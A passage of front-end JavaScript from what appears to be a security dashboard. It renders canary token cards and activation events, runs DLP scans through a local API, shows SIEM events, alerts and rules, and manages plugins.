            'aws-key': 'border-l-orange-500', 'slack-token': 'border-l-red-500', 'generic-url': 'border-l-cyan-500',
            'env-file': 'border-l-yellow-500', 'config-file': 'border-l-gray-500'
        };
        const color = colors[t.type] || 'border-l-cyber';
        const isMultiline = t.type === 'env-file' || t.type === 'config-file';
        const displayVal = isMultiline
            ? `<pre class="text-xs text-gray-300 mt-2 p-2 bg-void rounded overflow-x-auto max-h-32">${canaryEscapeHtml(t.value)}</pre>`
            : `<code class="text-green-400 text-xs break-all">${canaryEscapeHtml(t.value)}</code>`;

        return `<div class="bg-deep rounded-lg border border-cyber ${color} border-l-4 p-4">
            <div class="flex items-start justify-between">
                <div class="flex-1 min-w-0">
                    <div class="flex items-center gap-2 mb-1">
                        <span class="px-2 py-0.5 rounded text-xs font-mono bg-void border border-cyber">${t.type}</span>
                        <span class="text-white font-semibold text-sm">${canaryEscapeHtml(t.name || 'Unnamed')}</span>
                        <span class="text-xs text-gray-500">${new Date(t.created_at).toLocaleString()}</span>
                    </div>
                    ${displayVal}
                    ${t.notes ? `<p class="text-xs text-gray-500 mt-1">📝 ${canaryEscapeHtml(t.notes)}</p>` : ''}
                    <p class="text-xs text-gray-600 mt-1">ID: <code class="text-gray-400">${t.id}</code> | Expires: ${new Date(t.expires_at).toLocaleDateString()}</p>
                </div>
                <div class="flex gap-2 shrink-0 ml-4">
                    <button onclick="copyCanaryValue('${t.id}')" class="px-3 py-1 text-xs bg-cyber hover:bg-neon text-white rounded transition-colors" data-i18n="canary-copy">Copy</button>
                    <button onclick="deleteCanaryToken('${t.id}')" class="px-3 py-1 text-xs border border-blood hover:bg-blood/20 text-blood rounded transition-colors" data-i18n="canary-delete">Delete</button>
                </div>
            </div>
        </div>`;
    }

    function buildCanaryEventRow(e) {
        const icon = e.country ? '🌍' : '💻';
        return `<div class="bg-deep/50 rounded-lg border border-cyber/50 p-3 flex items-start gap-3">
            <span class="text-lg">${icon}</span>
            <div class="flex-1 min-w-0">
                <div class="flex items-center gap-2">
                    <span class="text-blood font-mono text-sm font-bold">⚠ ACTIVATED</span>
                    <span class="text-white text-sm">${canaryEscapeHtml(e.token_name || 'Unknown')}</span>
                </div>
                <div class="text-xs text-gray-400 mt-1">
                    🕐 ${new Date(e.timestamp).toLocaleString()} |
                    🌐 ${canaryEscapeHtml(e.ip)} |
                    📱 ${canaryEscapeHtml(e.user_agent?.substring(0, 60))}
                    ${e.country ? `| 📍 ${canaryEscapeHtml(e.country)}` : ''}
                    ${e.referer ? `| 🔗 ${canaryEscapeHtml(e.referer)}` : ''}
                </div>
            </div>
        </div>`;
    }

    window.copyCanaryValue = async function(tokenId) {
        try {
            const resp = await fetch('/api/canary/tokens');
            const data = await resp.json();
            const token = data.tokens?.find(t => t.id === tokenId);
            if (token) {
                await navigator.clipboard.writeText(token.value);
                const btn = event?.target || document.querySelector(`[onclick*="${tokenId}"]`);
                if (btn) {
                    const orig = btn.textContent;
                    btn.textContent = '✅';
                    setTimeout(() => btn.textContent = orig, 1500);
                }
            }
        } catch (err) {
            console.error('Copy failed:', err);
        }
    };

    window.deleteCanaryToken = async function(tokenId) {
        if (!confirm('Delete this canary token? This cannot be undone.')) return;
        try {
            const resp = await fetch(`/api/canary/token/${tokenId}`, { method: 'DELETE' });
            const data = await resp.json();
            if (data.ok) {
                await refreshCanaryTokens();
            }
        } catch (err) {
            console.error('Delete failed:', err);
        }
    };

    function showCanaryError(msg) {
        const el = document.getElementById('canary-error');
        if (el) { el.textContent = msg; el.classList.remove('hidden'); }
    }

    function hideCanaryError() {
        document.getElementById('canary-error')?.classList.add('hidden');
    }

    function canaryEscapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    // Auto-refresh on tab switch
    const origCanarySwitch = window.switchTab;
    window.switchTab = function(name) {
        if (name === 'canary') {
            refreshCanaryTokens();
            refreshCanaryEvents();
        }
        if (origCanarySwitch) origCanarySwitch(name);
    };

    // ════════════════════════════════════════════════════════════════
    //  DLP SCANNER MODULE
    // ════════════════════════════════════════════════════════════════

    // Text scan
    document.getElementById('dlp-scan-btn')?.addEventListener('click', () => {
        const text = document.getElementById('dlp-text-input')?.value?.trim();
        if (text) runDlpScan('text', text);
    });

    // File upload
    document.getElementById('dlp-dropzone')?.addEventListener('click', () => {
        document.getElementById('dlp-file-input')?.click();
    });
    document.getElementById('dlp-file-input')?.addEventListener('change', (e) => {
        const file = e.target.files?.[0];
        if (file) handleDlpFile(file);
    });
    document.getElementById('dlp-dropzone')?.addEventListener('dragover', (e) => { e.preventDefault(); e.currentTarget.classList.add('border-neon'); });
    document.getElementById('dlp-dropzone')?.addEventListener('dragleave', (e) => { e.currentTarget.classList.remove('border-neon'); });
    document.getElementById('dlp-dropzone')?.addEventListener('drop', (e) => {
        e.preventDefault(); e.currentTarget.classList.remove('border-neon');
        const file = e.dataTransfer.files?.[0];
        if (file) handleDlpFile(file);
    });

    // URL scan
    document.getElementById('dlp-url-btn')?.addEventListener('click', () => {
        const url = document.getElementById('dlp-url-input')?.value?.trim();
        if (url) runDlpScan('url', url);
    });
    document.getElementById('dlp-url-input')?.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') document.getElementById('dlp-url-btn')?.click();
    });

    async function runDlpScan(mode, value) {
        showDlpLoading(true);
        hideDlpError();
        document.getElementById('dlp-results')?.classList.add('hidden');

        try {
            let resp;
            if (mode === 'text') {
                resp = await fetch('/api/dlp/scan', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({text: value}) });
            } else if (mode === 'url') {
                resp = await fetch(`/api/dlp/scan-url?url=${encodeURIComponent(value)}`);
            }
            const data = await resp.json();
            if (data.ok) {
                renderDlpResults(data);
                if (data.findings && window.addFinding) data.findings.forEach(f => window.addFinding(f));
            } else {
                showDlpError(data.error || 'Scan failed');
            }
        } catch (err) {
            showDlpError('Error: ' + err.message);
        } finally {
            showDlpLoading(false);
        }
    }

    async function handleDlpFile(file) {
        if (file.size > 20 * 1024 * 1024) { showDlpError('File too large (max 20MB)'); return; }
        showDlpLoading(true);
        hideDlpError();
        document.getElementById('dlp-results')?.classList.add('hidden');
        const fd = new FormData();
        fd.append('file', file);
        try {
            const resp = await fetch('/api/dlp/scan-file', { method: 'POST', body: fd });
            const data = await resp.json();
            if (data.ok) {
                renderDlpResults(data);
                if (data.findings && window.addFinding) data.findings.forEach(f => window.addFinding(f));
            } else {
                showDlpError(data.error || 'Scan failed');
            }
        } catch (err) { showDlpError('Error: ' + err.message); }
        finally { showDlpLoading(false); }
    }

    function renderDlpResults(data) {
        document.getElementById('dlp-results')?.classList.remove('hidden');
        document.getElementById('dlp-findings-count').textContent = data.findings_count || 0;

        const high = data.findings?.filter(f => f.severity === 'high')?.length || 0;
        const med = data.findings?.filter(f => f.severity === 'medium')?.length || 0;
        const low = data.findings?.filter(f => f.severity === 'low' || f.severity === 'info')?.length || 0;
        document.getElementById('dlp-high-count').textContent = high;
        document.getElementById('dlp-medium-count').textContent = med;
        document.getElementById('dlp-low-count').textContent = low;

        const risk = data.risk_score || 0;
        document.getElementById('dlp-risk-value').textContent = risk.toFixed(1) + '%';
        const bar = document.getElementById('dlp-risk-bar');
        bar.style.width = risk + '%';
        bar.className = `h-3 rounded-full transition-all duration-500 ${risk > 70 ? 'bg-blood' : risk > 30 ? 'bg-yellow-500' : 'bg-neon'}`;

        const badge = document.getElementById('dlp-risk-badge');
        badge.textContent = data.findings_count > 0 ? `${data.findings_count} issues (${risk.toFixed(0)}%)` : '✓ Clean';
        badge.className = `px-3 py-1 rounded-full text-xs ${data.findings_count > 0 ? 'bg-blood/20 text-blood border border-blood' : 'bg-green-900/50 text-green-400 border border-green-700'}`;

        const list = document.getElementById('dlp-findings-list');
        if (data.findings?.length) {
            list.innerHTML = data.findings.map(f => `
                <div class="bg-deep rounded-lg border border-cyber p-3 ${dlpSevBorder(f.severity)}">
                    <div class="flex items-start gap-2">
                        <span class="text-lg">${dlpSevIcon(f.severity)}</span>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-center gap-2">
                                <span class="px-2 py-0.5 rounded text-xs font-mono ${dlpSevBadge(f.severity)}">${f.severity.toUpperCase()}</span>
                                <span class="text-white text-sm font-semibold">${escapeDlp(f.pattern_name)}</span>
                            </div>
                            <code class="text-xs text-green-400 block mt-1 break-all">${escapeDlp(f.value)}</code>
                            <p class="text-xs text-gray-500 mt-1">Line ${escapeDlp(String(f.line))}, Col ${escapeDlp(String(f.column))}</p>
                            <p class="text-xs text-gray-400 mt-1">${escapeDlp(f.recommendation)}</p>
                        </div>
                    </div>
                </div>
            `).join('');
        } else {
            list.innerHTML = '<p class="text-center text-green-400 py-4" data-i18n="dlp-clean">✅ No PII detected</p>';
        }
    }

    function dlpSevBorder(s) { return {high:'border-l-4 border-l-blood', medium:'border-l-4 border-l-yellow-500', low:'border-l-4 border-l-blue-500', info:'border-l-4 border-l-gray-500'}[s] || ''; }
    function dlpSevIcon(s) { return {high:'🔴', medium:'🟡', low:'🔵', info:'⚪'}[s] || '⚪'; }
    function dlpSevBadge(s) { return {high:'bg-blood/20 text-blood border border-blood', medium:'bg-yellow-900/30 text-yellow-400 border border-yellow-700', low:'bg-blue-900/30 text-blue-400 border border-blue-700', info:'bg-gray-800 text-gray-400 border border-gray-700'}[s] || ''; }

    function showDlpLoading(s) { document.getElementById('dlp-loading')?.classList.toggle('hidden', !s); }
    function showDlpError(m) { const e = document.getElementById('dlp-error'); if(e){e.textContent=m;e.classList.remove('hidden');} }
    function hideDlpError() { document.getElementById('dlp-error')?.classList.add('hidden'); }

    document.getElementById('dlp-export-json')?.addEventListener('click', () => {
        const list = document.getElementById('dlp-findings-list');
        if (!list?.children.length) return;
        const findings = [];
        list.querySelectorAll('.bg-deep.rounded-lg').forEach(card => {
            findings.push({ pattern: card.querySelector('.font-semibold')?.textContent, severity: card.querySelector('.font-mono')?.textContent, value: card.querySelector('.text-green-400')?.textContent });
        });
        downloadString(JSON.stringify(findings, null, 2), 'dlp-report.json', 'application/json');
    });

    document.getElementById('dlp-clear')?.addEventListener('click', () => {
        document.getElementById('dlp-results')?.classList.add('hidden');
        if (document.getElementById('dlp-text-input')) document.getElementById('dlp-text-input').value = '';
        if (document.getElementById('dlp-url-input')) document.getElementById('dlp-url-input').value = '';
        if (document.getElementById('dlp-file-input')) document.getElementById('dlp-file-input').value = '';
        document.getElementById('dlp-error')?.classList.add('hidden');
        document.getElementById('dlp-risk-badge').textContent = 'Ready';
        document.getElementById('dlp-risk-badge').className = 'px-3 py-1 rounded-full text-xs bg-void border border-cyber text-gray-400';
    });

    function escapeDlp(s) { if (!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

    // ════════════════════════════════════════════════════════════════
    //  SIEM DASHBOARD MODULE
    // ════════════════════════════════════════════════════════════════

    function refreshSIEM() {
        fetch('/api/siem/stats').then(r=>r.json()).then(d => {
            if (!d.ok) return;
            document.getElementById('siem-stat-total').textContent = d.total_events || 0;
            document.getElementById('siem-stat-critical').textContent = d.by_severity?.critical || 0;
            document.getElementById('siem-stat-high').textContent = d.by_severity?.high || 0;
            document.getElementById('siem-stat-medium').textContent = d.by_severity?.medium || 0;
            document.getElementById('siem-stat-low').textContent = (d.by_severity?.low||0) + (d.by_severity?.info||0);
            document.getElementById('siem-event-count').textContent = (d.total_events||0) + ' events';
            document.getElementById('siem-alert-count').textContent = (d.total_alerts||0) + ' alerts';
        }).catch(()=>{});

        // Events
        const sev = document.getElementById('siem-filter-severity')?.value || '';
        const src = document.getElementById('siem-filter-source')?.value || '';
        let url = '/api/siem/events?limit=50';
        if (sev) url += '&severity=' + sev;
        if (src) url += '&source=' + src;
        fetch(url).then(r=>r.json()).then(d => {
            if (!d.ok) return;
            const list = document.getElementById('siem-events-list');
            const empty = document.getElementById('siem-events-empty');
            if (!d.events?.length) { empty?.classList.remove('hidden'); list.innerHTML = ''; return; }
            empty?.classList.add('hidden');
            list.innerHTML = d.events.map(e => `
                <div class="flex items-start gap-2 p-2 rounded bg-deep/30 border border-cyber/30 hover:border-cyber text-xs ${siemSevBorder(e.severity)}">
                    <span>${siemSevIcon(e.severity)}</span>
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center gap-1">
                            <span class="px-1.5 py-0.5 rounded text-[10px] font-mono ${siemSevBadge(e.severity)}">${e.severity?.toUpperCase()}</span>
                            <span class="text-gray-400">[${e.source}]</span>
                            <span class="text-white font-medium truncate">${siemEscape(e.title)}</span>
                        </div>
                        <div class="text-gray-600 mt-0.5">${e.timestamp?.slice(0,19) || ''} ${e.ip ? '| '+siemEscape(e.ip) : ''}</div>
                    </div>
                </div>
            `).join('');
        }).catch(()=>{});

        // Alerts
        fetch('/api/siem/alerts?limit=10').then(r=>r.json()).then(d => {
            if (!d.ok) return;
            const list = document.getElementById('siem-alerts-list');
            const empty = document.getElementById('siem-alerts-empty');
            if (!d.alerts?.length) { empty?.classList.remove('hidden'); list.innerHTML = ''; return; }
            empty?.classList.add('hidden');
            list.innerHTML = d.alerts.map(a => `
                <div class="bg-deep rounded-lg border border-blood/50 p-3">
                    <div class="flex items-center gap-1 mb-1">
                        <span class="text-blood">🚨</span>
                        <span class="px-1.5 py-0.5 rounded text-[10px] font-mono bg-blood/20 text-blood border border-blood">${a.severity?.toUpperCase()}</span>
                        <span class="text-white text-xs font-semibold">${siemEscape(a.rule_name)}</span>
                    </div>
                    <p class="text-xs text-gray-300">${siemEscape(a.title)}</p>
                    <p class="text-[10px] text-gray-600 mt-1">${a.timestamp?.slice(0,19) || ''}</p>
                </div>
            `).join('');
        }).catch(()=>{});

        // Rules
        fetch('/api/siem/rules').then(r=>r.json()).then(d => {
            if (!d.ok) return;
            const list = document.getElementById('siem-rules-list');
            if (!d.rules?.length) { list.innerHTML = '<p class="text-gray-600 text-xs">No rules defined.</p>'; return; }
            list.innerHTML = d.rules.map(r => `
                <div class="bg-deep rounded border border-cyber p-2">
                    <div class="flex items-center gap-1 mb-1">
                        <span class="text-[10px] font-mono px-1 py-0.5 rounded ${r.enabled ? 'bg-green-900/50 text-green-400' : 'bg-gray-800 text-gray-500'}">${r.enabled ? 'ACTIVE' : 'DISABLED'}</span>
                        <span class="text-xs text-white truncate">${siemEscape(r.name)}</span>
                    </div>
                    <p class="text-[10px] text-gray-500">${siemEscape(r.description)}</p>
                </div>
            `).join('');
        }).catch(()=>{});
    }

    function siemSevBorder(s) { return {'critical':'border-l-2 border-l-blood','high':'border-l-2 border-l-red-500','medium':'border-l-2 border-l-yellow-500','low':'border-l-2 border-l-blue-500','info':'border-l-2 border-l-gray-500'}[s]||''; }
    function siemSevIcon(s) { return {'critical':'🔴','high':'🟠','medium':'🟡','low':'🔵','info':'⚪'}[s]||'⚪'; }
    function siemSevBadge(s) { return {'critical':'bg-blood/20 text-blood border border-blood','high':'bg-red-900/30 text-red-400 border border-red-700','medium':'bg-yellow-900/30 text-yellow-400 border border-yellow-700','low':'bg-blue-900/30 text-blue-400 border border-blue-700','info':'bg-gray-800 text-gray-400 border border-gray-700'}[s]||''; }
    function siemEscape(s) { if(!s)return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

    // SIEM event listeners
    document.getElementById('siem-refresh-btn')?.addEventListener('click', refreshSIEM);
    document.getElementById('siem-test-event-btn')?.addEventListener('click', () => {
        const sources = ['ssh','docker','api','canary','dlp','firewall','system'];
        const severities = ['info','low','medium','high','critical'];
        const source = sources[Math.floor(Math.random()*sources.length)];
        const severity = severities[Math.floor(Math.random()*severities.length)];
        fetch('/api/siem/event', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                source, severity,
                title: `Test ${severity} event from ${source}`,
                detail: `Automated test event generated at ${new Date().toISOString()}`,
                tags: ['test', source],
                ip: '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)
            })
        }).then(r=>r.json()).then(d => {
            if (d.ok) refreshSIEM();
        });
    });
    document.getElementById('siem-filter-severity')?.addEventListener('change', refreshSIEM);
    document.getElementById('siem-filter-source')?.addEventListener('change', refreshSIEM);

    // Auto-refresh on tab switch (wrap existing switchTab)
    const _origSwitchTab = window.switchTab;
    window.switchTab = function(name) {
        if (name === 'siem') refreshSIEM();
        if (_origSwitchTab) _origSwitchTab(name);
    };

    // Auto-refresh every 30 seconds (only when SIEM tab is visible)
    setInterval(() => {
        const siemTab = document.getElementById('tab-siem');
        if (siemTab && !siemTab.classList.contains('hidden')) refreshSIEM();
    }, 30000);

    // Expose for global access
    window.runDlpScan = runDlpScan;
    window.handleDlpFile = handleDlpFile;
    window.refreshSIEM = refreshSIEM;

    // ════════════════════════════════════════════════════════════════
    //  PLUGIN SYSTEM MODULE
    // ════════════════════════════════════════════════════════════════

    function getPluginStatusLabel(status) {
        const labels = { loaded: 'Loaded', unloaded: 'Unloaded', error: 'Error' };
        return labels[status] || 'Discovered';
    }

    function pluginEscHtml(s) {
        if (!s) return '';
        return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function refreshPlugins() {
        fetch('/api/plugins').then(r=>r.json()).then(d => {
            if (!d.ok) return;
            const plugins = d.plugins || [];
            const total = plugins.length;
            const loaded = plugins.filter(p => p.status === 'loaded').length;
            const discovered = plugins.filter(p => p.status === 'unloaded' || p.status === undefined).length;
            const errors = plugins.filter(p => p.status === 'error').length;

            document.getElementById('plugins-stat-total').textContent = total;
            document.getElementById('plugins-stat-loaded').textContent = loaded;
            document.getElementById('plugins-stat-discovered').textContent = discovered;
            document.getElementById('plugins-stat-error').textContent = errors;
            document.getElementById('plugins-count').textContent = total + ' plugins';

            const grid = document.getElementById('plugins-grid');
            if (!plugins.length) {
                grid.innerHTML = '<p class="text-gray-600 italic col-span-full text-center py-8" data-i18n="plugins-no-plugins">No plugins discovered.</p>';
                return;
            }
            grid.innerHTML = plugins.map(p => `
                <div class="bg-deep rounded-lg border ${p.status === 'loaded' ? 'border-green-700/50' : p.status === 'error' ? 'border-blood/50' : 'border-cyber/30'} p-4">
                    <div class="flex items-center justify-between mb-2">
                        <h4 class="text-white font-semibold text-sm truncate">${pluginEscHtml(p.name)}</h4>
                        <span class="px-2 py-0.5 rounded text-[10px] font-mono ${p.status === 'loaded' ? 'bg-green-900/40 text-green-400 border border-green-700' : p.status === 'error' ? 'bg-blood/20 text-blood border border-blood' : 'bg-gray-800 text-gray-400 border border-gray-700'}">${getPluginStatusLabel(p.status)}</span>
                    </div>
                    <p class="text-xs text-gray-500 mb-2">${pluginEscHtml(p.manifest?.description || 'No description')}</p>
                    <div class="flex flex-wrap gap-1 mb-2">
                        <span class="text-[10px] text-gray-600">v${pluginEscHtml(p.manifest?.version || '?')}</span>
                        <span class="text-[10px] text-gray-600">by ${pluginEscHtml(p.manifest?.author || '?')}</span>
                    </div>
                    ${p.manifest?.hooks?.length ? `<div class="flex flex-wrap gap-1 mb-3">${p.manifest.hooks.map(h => `<span class="px-1.5 py-0.5 rounded text-[9px] bg-void text-cyber border border-cyber/50">${pluginEscHtml(h)}</span>`).join('')}</div>` : ''}
                    <div class="flex flex-wrap gap-1 mt-auto pt-2 border-t border-cyber/20">
                        ${p.status === 'loaded' ? `
                            <button class="px-2 py-1 text-[10px] bg-yellow-900/30 hover:bg-yellow-900/50 text-yellow-400 border border-yellow-700 rounded" onclick="pluginAction('${p.name}','reload')" data-i18n="plugins-btn-reload">Reload</button>
                            <button class="px-2 py-1 text-[10px] bg-red-900/30 hover:bg-red-900/50 text-red-400 border border-red-700 rounded" onclick="pluginAction('${p.name}','unload')" data-i18n="plugins-btn-unload">Unload</button>
                            ${p.enabled ? `<button class="px-2 py-1 text-[10px] bg-gray-800 hover:bg-gray-700 text-gray-400 border border-gray-700 rounded" onclick="pluginAction('${p.name}','disable')" data-i18n="plugins-btn-disable">Disable</button>` : `<button class="px-2 py-1 text-[10px] bg-green-900/30 hover:bg-green-900/50 text-green-400 border border-green-700 rounded" onclick="pluginAction('${p.name}','enable')" data-i18n="plugins-btn-enable">Enable</button>`}
                        ` : p.status === 'error' ? `
                            <button class="px-2 py-1 text-[10px] bg-cyber hover:bg-neon text-white border border-cyber rounded" onclick="pluginAction('${p.name}','load')" data-i18n="plugins-btn-load">Load</button>
                        ` : `
                            <button class="px-2 py-1 text-[10px] bg-cyber hover:bg-neon text-white border border-cyber rounded" onclick="pluginAction('${p.name}','load')" data-i18n="plugins-btn-load">Load</button>
                        `}
                    </div>
                    ${p.error ? `<p class="text-[10px] text-blood mt-1">${pluginEscHtml(p.error)}</p>` : ''}
                </div>
            `).join('');
        }).catch(() => {});
    }

    function pluginAction(name, action) {
        fetch(`/api/plugins/${encodeURIComponent(name)}/${action}`, { method: 'POST' })
            .then(r => r.json())
            .then(d => {
                refreshPlugins();
                if (!d.ok) {
                    appendOutput(`[PLUGIN] ❌ ${action} ${name}: ${d.error || 'unknown error'}`);
                } else {
                    appendOutput(`[PLUGIN] ✅ ${action} ${name} successful`);
                }
            })
            .catch(() => appendOutput(`[PLUGIN] ❌ ${action} ${name}: network error`));
    }

    function closePluginModal() {
        document.getElementById('plugins-modal').classList.add('hidden');
    }

    // Plugin event listeners
    document.getElementById('plugins-refresh-btn')?.addEventListener('click', refreshPlugins);

    // Auto-refresh on tab switch (wrap existing)
    const _origSwitchTabPlugins = window.switchTab;
    window.switchTab = function(name) {
        if (name === 'plugins') refreshPlugins();
        if (_origSwitchTabPlugins) _origSwitchTabPlugins(name);
    };

    // Expose globals
    window.refreshPlugins = refreshPlugins;
    window.pluginAction = pluginAction;
    window.closePluginModal = closePluginModal;
});
